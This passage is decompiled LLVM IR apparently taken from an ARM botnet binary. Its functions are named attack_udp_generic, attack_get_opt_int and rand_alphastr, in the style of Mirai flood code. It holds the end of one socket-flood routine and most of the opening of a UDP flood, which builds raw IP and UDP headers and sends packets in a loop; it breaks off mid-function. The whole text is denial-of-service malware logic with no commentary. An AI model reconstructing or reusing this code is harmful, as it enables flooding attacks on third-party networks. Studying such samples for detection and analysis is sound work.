  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v4_cba4 = zext i8 %v3_cba4 to i32
  %v5_cbac = call i32 @llvm.bswap.i32(i32 %v0_cb94)
  %v7_cbb0 = lshr i32 %v0_cb90, %v4_cba4
  %v8_cbb0 = add i32 %v7_cbb0, %v5_cbac
  %v1_cbb4 = and i32 %v8_cbb0, 16711680
  store i32 %v1_cbb4, i32* %r0.global-to-local, align 4
  %v5_cbc8 = call i32 @llvm.bswap.i32(i32 %v8_cbb0)
  store i32 %v5_cbc8, i32* %r3.global-to-local, align 4
  %v2_cbcc = add i32 %v0_cba4, 4
  %v3_cbcc = inttoptr i32 %v2_cbcc to i32*
  store i32 %v5_cbc8, i32* %v3_cbcc, align 4
  %v0_cbd0 = load i32, i32* @r5, align 4
  %v0_cbd4 = load i32, i32* @r6, align 4
  %v1_cbd4 = load i32, i32* @sb, align 4
  %v2_cbd4 = add i32 %v1_cbd4, %v0_cbd4
  %v3_cbd4 = inttoptr i32 %v2_cbd4 to i32*
  %v4_cbd4 = load i32, i32* %v3_cbd4, align 4
  store i32 %v4_cbd4, i32* %r0.global-to-local, align 4
  %v3_cbdc = call i32 @__libc_connect(i32 %v4_cbd4, i32 %v0_cbd0, i32 16)
  store i32 %v3_cbdc, i32* %r0.global-to-local, align 4
  %v0_cbe0 = load i32, i32* @sl, align 4
  %v1_cbe0 = load i32, i32* @fp, align 4
  %v9_cbe0 = icmp eq i32 %v0_cbe0, %v1_cbe0
  %v0_cbe4 = load i32, i32* @r6, align 4
  %v1_cbe4 = add i32 %v0_cbe4, 4
  store i32 %v1_cbe4, i32* @r6, align 4
  br i1 %v9_cbe0, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cab4
  %v1_cbf021 = phi i32 [ 0, %dec_label_pc_cab4 ], [ %v0_cbe0, %dec_label_pc_cb8c ], [ %v0_cb30, %dec_label_pc_cb20 ]
  store i32 0, i32* @r5, align 4
  %v2_cc24 = icmp eq i32 %v1_ca70, 0
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbf0.backedge, %dec_label_pc_cbec
  %v1_cbf0 = phi i32 [ %v1_cbf0.pre, %dec_label_pc_cbf0.backedge ], [ %v1_cbf021, %dec_label_pc_cbec ]
  %v1_cc28 = phi i32 [ %v0_cbf019, %dec_label_pc_cbf0.backedge ], [ 0, %dec_label_pc_cbec ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v5_cbf8 = icmp slt i32 %v1_cc28, %v1_cbf0
  br i1 %v5_cbf8, label %dec_label_pc_cc1c, label %dec_label_pc_cbfc

dec_label_pc_cbfc:                                ; preds = %dec_label_pc_cbf0
  %v2_cbfc = call i32 @__GI_time(i32* null)
  store i32 %v2_cbfc, i32* %r0.global-to-local, align 4
  store i32 %v0_caa810, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v6_cc0c = icmp slt i32 %v0_caa810, %v2_cbfc
  br i1 %v6_cc0c, label %dec_label_pc_cc10, label %dec_label_pc_cbf0.backedge

dec_label_pc_cc10.loopexit14:                     ; preds = %dec_label_pc_cacc
  %v1_cc18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbfc, %dec_label_pc_cc10.loopexit14
  %v1_cc18 = phi i32 [ %v1_cc18.pre, %dec_label_pc_cc10.loopexit14 ], [ %v2_cbfc, %dec_label_pc_cbfc ]
  ret i32 %v1_cc18

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cbf0
  store i32 %v2_c9e0, i32* %r3.global-to-local, align 4
  %v4_cc28 = mul i32 %v1_cc28, 4
  %v5_cc28 = add i32 %v4_cc28, %v2_c9e0
  %v6_cc28 = inttoptr i32 %v5_cc28 to i32*
  %v7_cc28 = load i32, i32* %v6_cc28, align 4
  store i32 %v7_cc28, i32* @r4, align 4
  br i1 %v2_cc24, label %dec_label_pc_cc30, label %dec_label_pc_cc4c

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc1c, %dec_label_pc_cc4c
  %v0_cc34 = phi i32 [ %v7_cc28, %dec_label_pc_cc1c ], [ %v0_cc34.pre, %dec_label_pc_cc4c ]
  %v1_cc30 = phi i32 [ %v1_cc28, %dec_label_pc_cc1c ], [ %v1_cc30.pre, %dec_label_pc_cc4c ]
  %v0_cc30 = load i32, i32* @sb, align 4
  %v4_cc30 = mul i32 %v1_cc30, 4
  %v5_cc30 = add i32 %v4_cc30, %v0_cc30
  %v6_cc30 = inttoptr i32 %v5_cc30 to i32*
  %v7_cc30 = load i32, i32* %v6_cc30, align 4
  store i32 %v7_cc30, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cc40 = call i32 @__libc_send(i32 %v7_cc30, i32 %v0_cc34, i32 %v3_ca54, i32 16384)
  store i32 %v4_cc40, i32* %r0.global-to-local, align 4
  %v0_cc44 = load i32, i32* @r5, align 4
  %v1_cc44 = add i32 %v0_cc44, 1
  store i32 %v1_cc44, i32* @r5, align 4
  br label %dec_label_pc_cbf0.backedge

dec_label_pc_cbf0.backedge:                       ; preds = %dec_label_pc_cc30, %dec_label_pc_cbfc
  %v0_cbf019 = phi i32 [ %v1_cc44, %dec_label_pc_cc30 ], [ 0, %dec_label_pc_cbfc ]
  %v1_cbf0.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc1c
  store i32 %v7_cc28, i32* %r0.global-to-local, align 4
  %v2_cc54 = call i32 @rand_alphastr(i32 %v7_cc28, i32 %v3_ca54)
  store i32 %v2_cc54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc60 = load i32, i32* @r4, align 4
  %v4_cc60 = add i32 %v3_cc60, %v3_ca54
  %v5_cc60 = inttoptr i32 %v4_cc60 to i8*
  store i8 0, i8* %v5_cc60, align 1
  %v1_cc30.pre = load i32, i32* @r5, align 4
  %v0_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cc68:                                ; preds = %entry
  %v1_caa012 = load i32, i32* @r7, align 4
  %v2_caa013 = add i32 %v1_caa012, %v2_ca8c
  store i32 %v2_caa013, i32* %r0.global-to-local, align 4
  %v0_cc68 = call i32 @rand_next()
  %v3_cc70 = urem i32 %v0_cc68, 65536
  store i32 %v3_cc70, i32* %r0.global-to-local, align 4
  %extract.t59 = trunc i32 %v0_cc68 to i16
  br label %dec_label_pc_cab4

; uselistorder directives
  uselistorder i32 %v0_cc68, { 1, 0 }
  uselistorder i32 %v2_caa013, { 1, 0 }
  uselistorder i32 %v7_cc28, { 2, 1, 0, 3 }
  uselistorder i32 %v5_cbc8, { 1, 0 }
  uselistorder i32 %v0_cb78, { 1, 0 }
  uselistorder i32 %v0_cb50, { 2, 0, 1 }
  uselistorder i32 %v3_cad8, { 1, 0, 2 }
  uselistorder i32 %v0_caa810, { 1, 0 }
  uselistorder i32 %v4_ca9c, { 1, 0 }
  uselistorder i32 %v3_ca54, { 2, 1, 0 }
  uselistorder i32 %v2_c9e0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 14, 13, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 19, 8, 7, 11, 9, 10, 12, 13, 23, 21, 15, 14, 16, 18, 20, 17, 22, 25, 24, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc30, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 1, 0 }
  uselistorder label %dec_label_pc_cacc, { 1, 0 }
  uselistorder label %dec_label_pc_cab4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_cc7c = load i32, i32* @lr, align 4
  store i32 0, i32* @r8, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_cca8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ccac = load i32, i32* @r4, align 4
  store i32 %v0_ccac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r8, align 4
  store i32 %v0_ccb8, i32* %r3.global-to-local, align 4
  %v0_ccbc = load i32, i32* @r5, align 4
  store i32 %v0_ccbc, i32* %r0.global-to-local, align 4
  %v5_ccc0 = inttoptr i32 %v0_ccac to i32*
  %v6_ccc0 = call i32 @attack_get_opt_int(i32 %v0_ccbc, i32* %v5_ccc0, i32 2, i32 %v0_ccb8)
  %v1_cccc = urem i32 %v6_ccc0, 256
  store i32 %v1_cccc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ccd8 = load i32, i32* @r4, align 4
  store i32 %v0_ccd8, i32* %r1.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r0.global-to-local, align 4
  %v5_cce0 = trunc i32 %v6_ccc0 to i8
  %v6_cce4 = inttoptr i32 %v0_ccd8 to i32*
  %v7_cce4 = call i32 @attack_get_opt_int(i32 %v0_ccdc, i32* %v6_cce4, i32 3, i32 65535)
  %v0_cce8 = load i32, i32* @r4, align 4
  store i32 %v0_cce8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_ccf8 = load i32, i32* @r5, align 4
  store i32 %v0_ccf8, i32* %r0.global-to-local, align 4
  %v5_ccfc = inttoptr i32 %v0_cce8 to i32*
  %v6_ccfc = call i32 @attack_get_opt_int(i32 %v0_ccf8, i32* %v5_ccfc, i32 4, i32 64)
  %v1_cd04 = urem i32 %v6_ccfc, 256
  store i32 %v1_cd04, i32* %ip.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r4, align 4
  store i32 %v0_cd08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_cd10 = load i32, i32* @r8, align 4
  store i32 %v0_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r5, align 4
  store i32 %v0_cd14, i32* %r0.global-to-local, align 4
  %v5_cd18 = trunc i32 %v6_ccfc to i8
  %v6_cd1c = inttoptr i32 %v0_cd08 to i32*
  %v7_cd1c = call i32 @attack_get_opt_int(i32 %v0_cd14, i32* %v6_cd1c, i32 5, i32 %v0_cd10)
  %v1_cd28 = urem i32 %v7_cd1c, 256
  store i32 %v1_cd28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cd34 = load i32, i32* @r4, align 4
  store i32 %v0_cd34, i32* %r1.global-to-local, align 4
  %v0_cd38 = load i32, i32* @r5, align 4
  store i32 %v0_cd38, i32* %r0.global-to-local, align 4
  %v5_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v6_cd40 = call i32 @attack_get_opt_int(i32 %v0_cd38, i32* %v5_cd40, i32 6, i32 65535)
  %v0_cd4c = load i32, i32* @r4, align 4
  store i32 %v0_cd4c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_cd58 = load i32, i32* @r5, align 4
  store i32 %v0_cd58, i32* %r0.global-to-local, align 4
  %v5_cd5c = inttoptr i32 %v0_cd4c to i32*
  %v6_cd5c = call i32 @attack_get_opt_int(i32 %v0_cd58, i32* %v5_cd5c, i32 7, i32 65535)
  %v0_cd60 = load i32, i32* @r4, align 4
  store i32 %v0_cd60, i32* %r1.global-to-local, align 4
  %v0_cd68 = load i32, i32* @r8, align 4
  store i32 %v0_cd68, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_cd70 = load i32, i32* @r5, align 4
  store i32 %v0_cd70, i32* %r0.global-to-local, align 4
  %v5_cd74 = inttoptr i32 %v0_cd60 to i32*
  %v6_cd74 = call i32 @attack_get_opt_int(i32 %v0_cd70, i32* %v5_cd74, i32 %v0_cd68, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cd80 = load i32, i32* @r4, align 4
  store i32 %v0_cd80, i32* %r1.global-to-local, align 4
  store i32 %v6_cd74, i32* @sl, align 4
  %v0_cd88 = load i32, i32* @r5, align 4
  store i32 %v0_cd88, i32* %r0.global-to-local, align 4
  %v4_cd8c = inttoptr i32 %v0_cd80 to i32*
  %v5_cd8c = call i32 @attack_get_opt_int(i32 %v0_cd88, i32* %v4_cd8c, i32 1, i32 1)
  %v2_cd98 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_cd98, i32* %r3.global-to-local, align 4
  %v1_cd9c = urem i32 %v5_cd8c, 256
  store i32 %v1_cd9c, i32* %ip.global-to-local, align 4
  %v0_cda0 = load i32, i32* @r4, align 4
  store i32 %v0_cda0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_cda8 = load i32, i32* @r5, align 4
  store i32 %v0_cda8, i32* %r0.global-to-local, align 4
  %v5_cdb0 = inttoptr i32 %v0_cda0 to i32*
  %v6_cdb0 = call i32 @attack_get_opt_int(i32 %v0_cda8, i32* %v5_cdb0, i32 24, i32 %v2_cd98)
  store i32 %v6_cdb0, i32* @sb, align 4
  %v0_cdb8 = load i32, i32* @r8, align 4
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  %v1_cdbc = inttoptr i32 %v0_cdb8 to i32*
  %v2_cdbc = call i32 @__GI_time(i32* %v1_cdbc)
  %v1_cdc0 = load i32, i32* @r6, align 4
  %v2_cdc0 = add i32 %v1_cdc0, %v2_cdbc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cdd4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_cdd4, i32* %r0.global-to-local, align 4
  %v7_cdd8 = icmp eq i32 %v3_cdd4, -1
  store i32 %v3_cdd4, i32* @fp, align 4
  br i1 %v7_cdd8, label %dec_label_pc_d22c, label %dec_label_pc_cde4

dec_label_pc_cde4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cdec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cdec, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cdf4 = load i32, i32* @r8, align 4
  store i32 %v0_cdf4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ce00 = call i32 @__GI_setsockopt(i32 %v3_cdd4, i32 %v0_cdf4, i32 3, i32 %v6_cdec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ce00, i32* %r0.global-to-local, align 4
  %v7_ce04 = icmp eq i32 %v5_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_d238, label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_cde4
  %v0_ce0c = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ce18 = urem i32 %v0_ce0c, 65536
  %v3_ce1c = icmp ugt i32 %v3_ce18, 1459
  br i1 %v3_ce1c, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_ce0c
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ce0c, %bb
  %storemerge = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  %v0_ce28 = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v6_cd40, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_ce3c = mul i32 %v6_cd5c, 65536
  store i32 %v3_ce3c, i32* %r2.global-to-local, align 4
  %v3_ce44 = urem i32 %v7_cce4, 65536
  %v3_ce48 = urem i32 %v6_cd40, 65536
  store i32 %v3_ce48, i32* %ip.global-to-local, align 4
  %v3_ce4c = urem i32 %v6_cd5c, 65536
  store i32 %v3_ce4c, i32* %r0.global-to-local, align 4
  %v2_ce50 = icmp eq i32 %arg2, 0
  %v0_ce58 = load i32, i32* @r8, align 4
  store i32 %v0_ce58, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %.dec_label_pc_cf84.preheader_crit_edge, label %dec_label_pc_ce6c

.dec_label_pc_cf84.preheader_crit_edge:           ; preds = %bb40
  %.pre = add nuw nsw i32 %v0_ce28, 8
  %.pre10 = add nuw nsw i32 %v0_ce28, 28
  br label %dec_label_pc_cf84.preheader

dec_label_pc_ce6c:                                ; preds = %bb40
  %v1_ce74 = add nuw nsw i32 %v0_ce28, 28
  %v1_ce78 = add nuw nsw i32 %v0_ce28, 8
  %tmp41 = mul nuw nsw i32 %v3_ce48, 256
  %v3_ce88 = and i32 %tmp41, 65280
  %v3_ce90 = mul i32 %v1_ce74, 65536
  store i32 %v3_ce90, i32* @lr, align 4
  %tmp42 = udiv i32 %v6_cd40, 256
  %v4_ce98 = urem i32 %tmp42, 256
  %v5_ce98 = or i32 %v3_ce88, %v4_ce98
  store i32 %v5_ce98, i32* @sl, align 4
  store i32 %v3_ce3c, i32* %r1.global-to-local, align 4
  %tmp43 = mul i32 %v6_cd5c, 256
  %v3_ceb0 = and i32 %tmp43, 65280
  %v2_ceb4 = icmp eq i32 %v1_cd28, 0
  %tmp44 = mul nuw nsw i32 %v1_ce74, 256
  %v3_ceb8 = and i32 %tmp44, 65280
  store i32 %v3_ceb8, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v7_cce4, 256
  %v3_cebc = and i32 %tmp45, 65280
  store i32 %v3_cebc, i32* %r2.global-to-local, align 4
  %tmp46 = mul nuw nsw i32 %v1_ce78, 256
  %v3_cec0 = and i32 %tmp46, 65280
  store i32 %v3_cec0, i32* %ip.global-to-local, align 4
  %tmp47 = udiv i32 %v6_cd5c, 256
  %v4_cec4 = urem i32 %tmp47, 256
  %v5_cec4 = or i32 %v4_cec4, %v3_ceb0
  store i32 %v5_cec4, i32* %r0.global-to-local, align 4
  %tmp48 = udiv i32 %v7_cce4, 256
  %v4_cec8 = urem i32 %tmp48, 256
  %v5_cec8 = or i32 %v4_cec8, %v3_cebc
  store i32 %v5_cec8, i32* @r8, align 4
  %tmp49 = udiv i32 %v1_ce74, 256
  %v4_cecc = urem i32 %tmp49, 256
  %v5_cecc = or i32 %v4_cecc, %v3_ceb8
  store i32 %v5_cecc, i32* @r6, align 4
  %tmp50 = udiv i32 %v1_ce78, 256
  %v4_ced0 = urem i32 %tmp50, 256
  %v5_ced0 = or i32 %v4_ced0, %v3_cec0
  store i32 %v5_ced0, i32* @r5, align 4
  %v5_ced4 = trunc i32 %v5_cec4 to i16
  store i32 0, i32* @r4, align 4
  br i1 %v2_ceb4, label %dec_label_pc_cee0.preheader, label %dec_label_pc_d16c.preheader

dec_label_pc_d16c.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_d1bc = sext i8 %v5_cd18 to i32
  %v4_d1fc = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_d16c

dec_label_pc_cee0.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_cf58 = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_cee0

dec_label_pc_cee0:                                ; preds = %dec_label_pc_cee0.preheader, %dec_label_pc_cee0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ceec = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ceec, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %r2.global-to-local, align 4
  %v2_cef8 = load i32, i32* @r4, align 4
  %v5_cef8 = mul i32 %v2_cef8, 4
  %v6_cef8 = add i32 %v5_cef8, %v2_cca8
  %v7_cef8 = inttoptr i32 %v6_cef8 to i32*
  store i32 %v2_ceec, i32* %v7_cef8, align 4
  %v3_cefc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cefc, i32* %r1.global-to-local, align 4
  %v0_cf00 = load i32, i32* %r2.global-to-local, align 4
  %v4_cf00 = mul i32 %v3_cefc, 4
  %v5_cf00 = add i32 %v0_cf00, %v4_cf00
  %v6_cf00 = inttoptr i32 %v5_cf00 to i32*
  %v7_cf00 = load i32, i32* %v6_cf00, align 4
  store i32 %v7_cf00, i32* %r3.global-to-local, align 4
  %v1_cf04 = inttoptr i32 %v7_cf00 to i8*
  %v2_cf04 = load i8, i8* %v1_cf04, align 1
  %tmp = urem i8 %v2_cf04, 16
  %v1_cf08 = zext i8 %tmp to i32
  %v1_cf0c = or i32 %v1_cf08, 64
  store i32 %v1_cf0c, i32* %r2.global-to-local, align 4
  %v1_cf10 = trunc i32 %v1_cf0c to i8
  store i8 %v1_cf10, i8* %v1_cf04, align 1
  %v0_cf14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf14 = inttoptr i32 %v0_cf14 to i8*
  %v2_cf14 = load i8, i8* %v1_cf14, align 1
  %v1_cf18 = and i8 %v2_cf14, -16
  %v1_cf1c = or i8 %v1_cf18, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_cf1c, i8* %v1_cf14, align 1
  %v0_cf28 = load i32, i32* %ip.global-to-local, align 4
  %v1_cf28 = trunc i32 %v0_cf28 to i8
  %v2_cf28 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf28 = add i32 %v2_cf28, 9
  %v4_cf28 = inttoptr i32 %v3_cf28 to i8*
  store i8 %v1_cf28, i8* %v4_cf28, align 1
  %v2_cf30 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf30 = add i32 %v2_cf30, 1
  %v4_cf30 = inttoptr i32 %v3_cf30 to i8*
  store i8 %v5_cce0, i8* %v4_cf30, align 1
  %v0_cf38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf38 = mul i32 %v0_cf38, 32
  store i32 %v3_cf38, i32* %r0.global-to-local, align 4
  %v2_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v3_cf3c = add i32 %v2_cf3c, 8
  %v4_cf3c = inttoptr i32 %v3_cf3c to i8*
  store i8 %v5_cd18, i8* %v4_cf3c, align 1
  %v0_cf40 = load i32, i32* @sb, align 4
  %v1_cf40 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf40 = add i32 %v1_cf40, 12
  %v3_cf40 = inttoptr i32 %v2_cf40 to i32*
  store i32 %v0_cf40, i32* %v3_cf40, align 4
  %v0_cf44 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf44 = load i32, i32* %r1.global-to-local, align 4
  %tmp52 = mul i32 %v1_cf44, -8
  %v5_cf44 = add i32 %v0_cf44, %tmp52
  %v1_cf48 = load i32, i32* @r7, align 4
  %v2_cf48 = add i32 %v5_cf44, %v1_cf48
  store i32 %v2_cf48, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_cf50 = add i32 %v1_cf44, 1
  store i32 %v1_cf50, i32* @r4, align 4
  %v1_cf54 = add i32 %v2_cf48, 16
  %v2_cf54 = inttoptr i32 %v1_cf54 to i32*
  %v3_cf54 = load i32, i32* %v2_cf54, align 4
  store i32 %v3_cf54, i32* %r2.global-to-local, align 4
  store i32 %v4_cf58, i32* %r0.global-to-local, align 4
  %v0_cf5c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf5c = add i32 %v0_cf5c, 20
  store i32 %v1_cf5c, i32* %r1.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r6, align 4
  %v1_cf64 = trunc i32 %v0_cf64 to i16
  %v3_cf64 = add i32 %v0_cf5c, 2
  %v4_cf64 = inttoptr i32 %v3_cf64 to i16*
  store i16 %v1_cf64, i16* %v4_cf64, align 2
  %v0_cf68 = load i32, i32* @r8, align 4
  %v1_cf68 = trunc i32 %v0_cf68 to i16
  %v2_cf68 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf68 = add i32 %v2_cf68, 4
  %v4_cf68 = inttoptr i32 %v3_cf68 to i16*
  store i16 %v1_cf68, i16* %v4_cf68, align 2
  %v0_cf6c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf6c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf6c = add i32 %v1_cf6c, 16
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v0_cf6c, i32* %v3_cf6c, align 4
  %v0_cf70 = load i32, i32* @sl, align 4
  %v1_cf70 = trunc i32 %v0_cf70 to i16
  %v2_cf70 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf70 = add i32 %v2_cf70, 20
  %v4_cf70 = inttoptr i32 %v3_cf70 to i16*
  store i16 %v1_cf70, i16* %v4_cf70, align 2
  %v0_cf74 = load i32, i32* @r5, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i16
  %v2_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf74 = add i32 %v2_cf74, 4
  %v4_cf74 = inttoptr i32 %v3_cf74 to i16*
  store i16 %v1_cf74, i16* %v4_cf74, align 2
  %v0_cf78 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf78 = trunc i32 %v0_cf78 to i16
  %v2_cf78 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf78 = add i32 %v2_cf78, 2
  %v4_cf78 = inttoptr i32 %v3_cf78 to i16*
  store i16 %v1_cf78, i16* %v4_cf78, align 2
  %v0_cf7c = load i32, i32* @r4, align 4
  store i32 %v0_cf7c, i32* %stack_var_-44, align 4
  %v5_cf80 = icmp slt i32 %v1_cf50, %arg2
  br i1 %v5_cf80, label %dec_label_pc_cee0, label %dec_label_pc_cf84.preheader

dec_label_pc_cf84.preheader:                      ; preds = %dec_label_pc_d16c, %dec_label_pc_cee0, %.dec_label_pc_cf84.preheader_crit_edge
  %v1_cfa4.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce74, %dec_label_pc_cee0 ], [ %v1_ce74, %dec_label_pc_d16c ]
  %v1_cfa0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce78, %dec_label_pc_cee0 ], [ %v1_ce78, %dec_label_pc_d16c ]
  %v3_d104 = icmp eq i32 %v3_ce44, 65535
  %v2_d140 = icmp eq i32 %v1_cd9c, 0
  br label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf84.preheader, %dec_label_pc_d218
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %dec_label_pc_d218, label %dec_label_pc_cf98

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf84
  store i32 %v0_ce28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_cfa0.pre-phi, i32* @sl, align 4
  store i32 %v1_cfa4.pre-phi, i32* @r8, align 4
  br label %dec_label_pc_d074

dec_label_pc_cfac:                                ; preds = %dec_label_pc_d074
  %v0_cfac = load i32, i32* @sb, align 4
  %v7_cfac = icmp eq i32 %v0_cfac, -1
  br i1 %v7_cfac, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  br i1 %v3_d104, label %dec_label_pc_d110, label %dec_label_pc_cfc8

dec_label_pc_cfc8:                                ; preds = %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge, %dec_label_pc_cfb4
  %v1_cfcc = phi i32 [ %v1_cfcc.pre, %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge ], [ 65535, %dec_label_pc_cfb4 ]
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v9_cfcc = icmp eq i32 %v3_ce48, %v1_cfcc
  br i1 %v9_cfcc, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v1_cfd8 = phi i32 [ %v1_d11c, %dec_label_pc_d110 ], [ %v1_cfcc, %dec_label_pc_cfc8 ]
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v9_cfd8 = icmp eq i32 %v3_ce4c, %v1_cfd8
